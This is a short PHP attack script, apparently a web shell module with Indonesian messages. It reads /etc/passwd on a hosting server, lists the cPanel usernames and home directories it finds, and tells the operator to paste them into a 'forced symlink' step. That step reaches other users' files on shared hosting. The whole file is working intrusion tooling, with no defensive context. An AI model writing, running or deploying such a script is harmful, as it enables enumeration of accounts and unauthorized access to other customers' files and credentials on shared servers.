<?php

@$passwd = fopen('/etc/passwd','r');
if (!$passwd) { die('<b>[+] ERROR | GA BISA BACA /etc/passwd [+]</b>'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
$str = fgets($passwd);
if ($i > 10)
{
$pos = strpos($str,':');
$username = substr($str,0,$pos);
$dirz = '/home/'.$username.'/';
if (($username != ''))
{
if ($dirz)
{
array_push($users,$username);
array_push($pub,$dirz);
}
}
}
$i++;
}
echo '<br><br>';
echo "<center><a style='font-weight:bold;'> <b>[+] USER ".sizeof($pub)." CPANEL DALAM SEMPAK"." [+]</b><br/><br/></a>";
echo '<textarea "cols="40"rows="30" >';
foreach ($users as $user)
{
$path = "$user";
echo "$path \n";
}
echo "</textarea><br><br>Copy dulu usernya dan paste di Symlink Paksa<br><br>";
echo "  <a href='?command'class='btn cta'>Symlink Paksa</a> ";
echo '</center></body></html>';


?>
